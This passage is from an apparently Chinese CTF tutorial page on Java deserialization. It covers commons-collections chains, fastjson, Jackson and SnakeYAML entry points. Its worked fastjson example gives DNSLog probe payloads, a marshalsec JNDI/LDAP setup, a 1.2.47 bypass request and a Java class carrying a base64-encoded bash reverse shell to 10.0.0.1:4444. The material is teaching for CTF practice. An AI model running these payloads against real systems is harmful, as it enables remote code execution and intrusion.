+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>    └── Map.Entry.setValue()              （TransformedMap 包装的 entry）
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>            └── InvokerTransformer.transform()
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>                    └── Method.invoke() → Runtime.exec(cmd)
+</code></pre></div>
+<p>和 URLDNS 完全同一套方法论：<strong>从 readObject 出发，找"属性可控的间接调用"，一环一环拼到危险函数</strong>。后续更通用的链（如利用 <code>ChainedTransformer</code> 把多个 transformer 串起来、用 <code>TemplatesImpl</code> 加载字节码的版本）都是在这个骨架上替换零件。CTF 中不必手工构造，ysoserial 直接生成即可，但要懂得根据目标依赖版本选链。</p>
+<h2 id="fastjson-jackson">第三方反序列化入口：fastjson / Jackson<a class="headerlink" href="#fastjson-jackson" title="Permanent link">¶</a></h2>
+<p>原生 <code>readObject()</code> 之外，Java 应用更多通过 JSON 库反序列化外部数据，这是 CTF 里更常见的考点。</p>
+<h3 id="fastjson">fastjson<a class="headerlink" href="#fastjson" title="Permanent link">¶</a></h3>
+<p>fastjson（1.2.x）的 <code>JSON.parseObject()</code> 支持一个"特性"：JSON 里写 <code>@type</code> 字段指定类名，反序列化时就会实例化该类并调用其 <strong>setter / getter</strong>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">{</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">  </span><span class="nt">"@type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"com.example.User"</span><span class="p">,</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">  </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="p">}</span>
+</code></pre></div>
+<p>危险在于：如果 <code>@type</code> 指向的类的 setter/getter 里有副作用（比如 <code>JdbcRowSetImpl</code> 的 <code>setDataSourceName</code> + <code>setAutoCommit</code> 会触发 JNDI 查找，进而加载远程恶意类），攻击者就能借 JSON 完成 RCE——这就是著名的 fastjson 反序列化漏洞（1.2.24、1.2.47 等多次绕过史）。</p>
+<p>识别 fastjson 入口的小技巧：</p>
+<ul>
+<li>目标接口接收 JSON，报错信息里出现 <code>com.alibaba.fastjson</code> 字样；</li>
+<li>可以用 <code>{"@type":"java.net.Inet4Address","val":"xxxx.dnslog.cn"}</code> 这类 payload 打 DNSLog 探测是否存在 fastjson 及版本区间；</li>
+<li>1.2.68 之后引入了 safeMode 和更严格的 checkAutoType，低版本（≤1.2.47）基本可直接利用。</li>
+</ul>
+<p>fastjson 的"调用 setter/getter"本质上是把 Java 反序列化的触发点从 <code>readObject()</code> 换成了属性赋值回调——还是同一个思想。</p>
+<h3 id="jackson">Jackson<a class="headerlink" href="#jackson" title="Permanent link">¶</a></h3>
+<p>Jackson 的 <code>ObjectMapper.readValue()</code> 默认只反序列化成普通 POJO，但开启 <code>enableDefaultTyping()</code> 后同样允许在 JSON 中指定类型（<code>["com.xxx.ClassName", {...}]</code>），历史上有多个基于第三方依赖 gadget（如 commons-dbcp 的 <code>BasicDataSource</code> 加载 JDBC 驱动执行 SQL/加载类）的 CVE。判断是否受影响看两点：是否开启 default typing、classpath 里是否有可利用的 gadget 依赖。</p>
+<h3 id="_3">其他<a class="headerlink" href="#_3" title="Permanent link">¶</a></h3>
+<ul>
+<li><strong>SnakeYAML</strong>：<code>new Yaml().load()</code> 默认会实例化 YAML 中指定的类（<code>!!javax.script.ScriptEngineManager</code> 是经典 payload），在加载自定义配置的 Java 应用里常见。</li>
+<li><strong>XMLDecoder / XStream</strong>：XML 形式的反序列化，思路相同。</li>
+</ul>
+<p>做题流程通常是：<strong>找入口（哪个库、哪个版本）→ DNSLog 探测确认 → 选对应 payload → RCE 或外带 flag</strong>。</p>
+<h2 id="ctf-fastjson">CTF 例题：fastjson 反序列化<a class="headerlink" href="#ctf-fastjson" title="Permanent link">¶</a></h2>
+<blockquote>
+<p>题型：一道典型的 fastjson 题。题目是一个 Java Web 应用，存在一个 <code>/login</code> 接口接收 JSON。拿到 flag 的完整过程如下。</p>
+</blockquote>
+<h3 id="1">1. 发现入口<a class="headerlink" href="#1" title="Permanent link">¶</a></h3>
+<p>访问 <code>/login</code>，用 Burp 抓包，正常请求形如：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">target:8080</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="p">{</span><span class="nt">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="nt">"password"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">}</span>
+</code></pre></div>
+<p>随手发一个畸形 JSON <code>{"username":}</code>，响应里报错：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>com.alibaba.fastjson.JSONException: syntax error, expect {, actual error ...
+</code></pre></div>
+<p>报错暴露了 <code>com.alibaba.fastjson</code>——后端用 fastjson 解析请求体，入口确认。</p>
+<h3 id="2-dnslog">2. DNSLog 探测版本<a class="headerlink" href="#2-dnslog" title="Permanent link">¶</a></h3>
+<p>发送经典的 <code>@type</code> 探测 payload：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">target:8080</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">78</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="p">{</span><span class="nt">"@type"</span><span class="p">:</span><span class="s2">"java.net.Inet4Address"</span><span class="p">,</span><span class="nt">"val"</span><span class="p">:</span><span class="s2">"probe1.xxxx.dnslog.cn"</span><span class="p">}</span>
+</code></pre></div>
+<p>DNSLog 平台收到 <code>probe1.xxxx.dnslog.cn</code> 的解析记录，说明 <code>@type</code> 生效，存在 fastjson 反序列化漏洞。再换 <code>java.net.InetSocketAddress{"address":,"val":"probe2.xxxx.dnslog.cn"}</code> 等 payload 组合测试，可进一步收窄版本区间；本题中 1.2.47 的绕过 payload 有效。</p>
+<h3 id="3-marshalsec-jndi">3. 构造利用链（marshalsec + JNDI）<a class="headerlink" href="#3-marshalsec-jndi" title="Permanent link">¶</a></h3>
+<p>fastjson 1.2.47 的经典利用方式是通过 <code>java.lang.Class</code> 加载 <code>com.sun.rowset.JdbcRowSetImpl</code>，配合 JNDI 注入加载远程恶意类。利用 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> 起一个 LDAP 服务：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># 1) 编写恶意类并编译</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>Exploit.java<span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="s">public class Exploit {</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="s">    static {</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="s">        try {</span>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="s">            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}");</span>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="s">        } catch (Exception e) {}</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="s">    }</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="s">}</span>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="s">EOF</span>
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>javac<span class="w"> </span>Exploit.java
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="c1"># 2) 用 python 起一个 HTTP 服务托管 Exploit.class</span>
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="c1"># 3) 启动 marshalsec LDAP 服务，指向上面的 HTTP 服务</span>
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>java<span class="w"> </span>-cp<span class="w"> </span>marshalsec-0.0.3-SNAPSHOT-all.jar<span class="w"> </span>marshalsec.jndi.LDAPRefServer<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="w">    </span><span class="s2">"http://10.0.0.1:8000/#Exploit"</span><span class="w"> </span><span class="m">1389</span>
+</code></pre></div>
+<p>发送 1.2.47 绕过 payload：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">target:8080</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">183</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="p">{</span>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="w">    </span><span class="nt">"a"</span><span class="p">:{</span>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="w">        </span><span class="nt">"@type"</span><span class="p">:</span><span class="s2">"java.lang.Class"</span><span class="p">,</span>
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="w">        </span><span class="nt">"val"</span><span class="p">:</span><span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="w">    </span><span class="p">},</span>
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="w">    </span><span class="nt">"b"</span><span class="p">:{</span>
+<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="w">        </span><span class="nt">"@type"</span><span class="p">:</span><span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span><span class="p">,</span>
+<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="w">        </span><span class="nt">"dataSourceName"</span><span class="p">:</span><span class="s2">"ldap://10.0.0.1:1389/Exploit"</span><span class="p">,</span>
+<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="w">        </span><span class="nt">"autoCommit"</span><span class="p">:</span><span class="kc">true</span>
+<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="p">}</span>
+</code></pre></div>
+<p>fastjson 会实例化 <code>JdbcRowSetImpl</code>，<code>autoCommit</code> setter 触发 JNDI 连接我们的 LDAP 服务，目标下载并加载 <code>Exploit.class</code>，静态代码块执行——反弹 shell 到手，<code>cat /flag</code> 收工。</p>
+<h3 id="4-pop">4. 复盘：这和 POP 链有什么关系<a class="headerlink" href="#4-pop" title="Permanent link">¶</a></h3>
+<p>回头看这道题，其实什么都没变：</p>
+<ul>
+<li><strong>入口</strong>：fastjson 的 <code>parseObject()</code> ↔ PHP 的 <code>unserialize()</code> ↔ 原生 Java 的 <code>readObject()</code>；</li>
+<li><strong>回调点</strong>：fastjson 调用的 setter/getter ↔ PHP 的魔术方法 ↔ 自定义 <code>readObject()</code>；</li>
+<li><strong>gadget</strong>：<code>JdbcRowSetImpl.setAutoCommit()</code> 里的 JNDI 查找 ↔ POP 链末端调用的危险函数。</li>
+</ul>
+<p>学会了 PHP 反序列化的"链式思维"，Java 反序列化要补的不过是：Java 序列化格式的特征识别、ysoserial 的使用、几条经典链的触发逻辑，以及 fastjson/Jackson 这类第三方入口的探测手法。剩下的，交给 DNSLog 和靶场练习即可。</p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../java_basic/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: Java安全基础"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        Java安全基础
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../spring/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: Spring漏洞"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        Spring漏洞
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#java">Java反序列化</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#java-readobject">Java 序列化格式与 readObject 触发点</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_1">最小可运行示例</a>
+        
+      </li>
+    
+      <li>
+        <a href="#readobject">触发点：readObject()</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#gadget-chain-ysoserial">Gadget Chain 与 ysoserial</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#gadget-chain">什么是 gadget chain</a>
+        
+      </li>
+    
+      <li>
+        <a href="#ysoserial">ysoserial：开箱即用的链生成器</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#urldns">手工推导 URLDNS 链</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#hashmapreadobject">第一环：HashMap.readObject()</a>
+        
+      </li>
+    
+      <li>
+        <a href="#urlhashcode">第二环：URL.hashCode()</a>
+        
+      </li>
+    
+      <li>
+        <a href="#urlstreamhandlerhashcode">第三环：URLStreamHandler.hashCode() 触发解析</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_2">串起来</a>
+        
+      </li>
+    
+      <li>
+        <a href="#poc">一个小坑与完整 PoC</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#cc1-commonscollections1">CC1 链的思想（CommonsCollections1）</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#invokertransformer">InvokerTransformer：任意方法调用器</a>
+        
+      </li>
+    
+      <li>
+        <a href="#transformedmapmap">TransformedMap：Map 包装器</a>
+        
+      </li>
+    
+      <li>
+        <a href="#setvalue">谁来调用 setValue()</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#fastjson-jackson">第三方反序列化入口：fastjson / Jackson</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#fastjson">fastjson</a>
+        
+      </li>
+    
+      <li>
+        <a href="#jackson">Jackson</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_3">其他</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#ctf-fastjson">CTF 例题：fastjson 反序列化</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#1">1. 发现入口</a>
+        
+      </li>
+    
+      <li>
+        <a href="#2-dnslog">2. DNSLog 探测版本</a>
+        
+      </li>
+    
+      <li>
+        <a href="#3-marshalsec-jndi">3. 构造利用链（marshalsec + JNDI）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#4-pop">4. 复盘：这和 POP 链有什么关系</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
